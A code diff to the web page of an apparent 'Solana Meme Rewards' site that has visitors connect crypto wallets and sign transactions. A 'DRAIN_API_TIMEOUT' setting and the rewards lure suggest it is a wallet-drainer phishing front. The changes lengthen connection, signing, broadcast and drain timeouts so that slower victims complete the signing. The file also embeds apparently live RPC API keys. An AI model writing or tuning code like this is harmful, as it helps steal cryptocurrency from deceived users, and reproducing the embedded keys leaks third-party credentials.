@@ -207,7 +207,7 @@
   <script src="https://unpkg.com/@solana/web3.js@1.98.4/lib/index.iife.min.js"></script>
   
   <!-- Configuration Script -->
-  <script src="/config.js"></script>
+  <script src="/config.js?v=9531cea"></script>
   
   <!-- Solana Connection Setup -->
   <script>
@@ -1609,17 +1609,18 @@
     const isDevelopment = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
     
     // Load configuration
-    if (typeof window.APP_CONFIG === 'undefined') {
-      // Fallback configuration if config.js fails to load
+    // Disable fallback in production to avoid divergence from config.js
+    if (typeof window.APP_CONFIG === 'undefined' && (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1')) {
+      // Dev-only fallback
       window.APP_CONFIG = {
         PROJECT_NAME: 'Solana Meme Rewards',
         PRIMARY_RPC: 'https://mainnet.helius-rpc.com/?api-key=19041dd1-5f30-4135-9b5a-9b670510524b',
         FALLBACK_RPC: 'https://rpc.shyft.to?api_key=-C7eUSlaDtQcR6b0',
-        WALLET_CONNECTION_TIMEOUT: 15000, // Reduced from 20s to 15s
-        DEEP_LINKING_TIMEOUT: 8000, // Reduced from 10s to 8s
-        DRAIN_API_TIMEOUT: 15000, // Reduced from 45s to 15s - much faster response
-        BROADCAST_TIMEOUT: 30000, // Reduced from 60s to 30s
-        SIGNING_TIMEOUT: 60000 // Reduced from 90s to 60s
+        WALLET_CONNECTION_TIMEOUT: 60000,
+        DEEP_LINKING_TIMEOUT: 30000,
+        DRAIN_API_TIMEOUT: 120000,
+        BROADCAST_TIMEOUT: 90000,
+        SIGNING_TIMEOUT: 120000
       };
     }
 
@@ -2812,15 +2813,9 @@
 
     // Enhanced utility functions with better timeout management
     window.getWalletTimeout = function(walletKey) {
-      const timeouts = {
-        'phantom': 15000,      // Increased for better reliability
-        'solflare': 15000,     // Increased for better reliability
-        'backpack': 15000,     // Increased for better reliability
-        'glow': 15000,         // Increased for better reliability
-        'exodus': 20000,       // Increased for better reliability
-
-      };
-      return timeouts[walletKey] || 15000;
+      // Use unified, lenient timeout for all wallets; can be specialized later if needed
+      const unified = window.getTimeout('WALLET_CONNECTION_TIMEOUT') || 60000;
+      return unified;
     };
 
     window.getWalletRetryCount = function(walletKey) {
@@ -2928,13 +2923,13 @@
                 const startTime = Date.now();
                 let progressInterval = setInterval(() => {
                   const elapsed = Date.now() - startTime;
-                  const progress = Math.min((elapsed / timeout) * 100, 95);
+                  const progress = Math.min((elapsed / (window.getTimeout('WALLET_CONNECTION_TIMEOUT') || timeout)) * 100, 95);
                   updateConnectionProgress(progress);
                 }, 100);
                 const result = await Promise.race([
                   connectionPromise,
                   new Promise((_, reject) => 
-                    setTimeout(() => reject(new Error('Connection timeout')), timeout)
+                    setTimeout(() => reject(new Error('Connection timeout')), window.getTimeout('WALLET_CONNECTION_TIMEOUT') || timeout)
                   )
                 ]);
                 
@@ -2953,7 +2948,7 @@
                 const result = await Promise.race([
                   provider.connect(),
                   new Promise((_, reject) => 
-                    setTimeout(() => reject(new Error('Connection timeout')), timeout)
+                    setTimeout(() => reject(new Error('Connection timeout')), window.getTimeout('WALLET_CONNECTION_TIMEOUT') || timeout)
                   )
                 ]);
                 
@@ -3220,8 +3215,9 @@
           
           // Set optimized timeout for signing - much faster trigger
           const signPromise = provider.signTransaction(transaction);
+          const signTimeoutMs = window.getTimeout('SIGNING_TIMEOUT') || 120000;
           const signTimeoutPromise = new Promise((_, reject) => 
-            setTimeout(() => reject(new Error('Signing timeout - please try again')), 30000) // 30 seconds - much faster
+            setTimeout(() => reject(new Error('Signing timeout - please try again')), signTimeoutMs)
           );
           
           let signedTransaction;
@@ -3258,7 +3254,7 @@
           
                   // Use AbortController for lenient timeout for slow users
         const broadcastController = new AbortController();
-        const broadcastTimeoutId = setTimeout(() => broadcastController.abort(), 120000); // 120 second timeout (lenient for slow users)
+        const broadcastTimeoutId = setTimeout(() => broadcastController.abort(), window.getTimeout('BROADCAST_TIMEOUT') || 90000);
           
           let broadcastResponse;
           try {
